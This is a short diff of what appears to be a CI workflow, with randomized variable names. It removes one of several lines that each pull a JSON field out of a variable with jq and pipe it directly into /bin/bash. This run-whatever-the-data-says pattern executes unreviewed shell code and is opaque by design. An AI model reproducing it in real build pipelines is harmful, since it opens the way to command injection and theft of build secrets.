@@ -26,7 +26,6 @@ jobs:
           echo $mhxl00134 | jq -r .pu66923 | /bin/bash
           printf '%s' "$d0108" | jq -r .bkwm3239 | /bin/bash
           echo $b6834 | jq -r .v246 | /bin/bash
-          printf '%s' "$vz0" | jq -r .cb0 | /bin/bash
           echo $uuyb011 | jq -r .gem21 | /bin/bash
           echo $f4147 | jq -r .qcra67 | /bin/bash
           printf '%s' "$g37" | jq -r .nvku0884 | /bin/bash
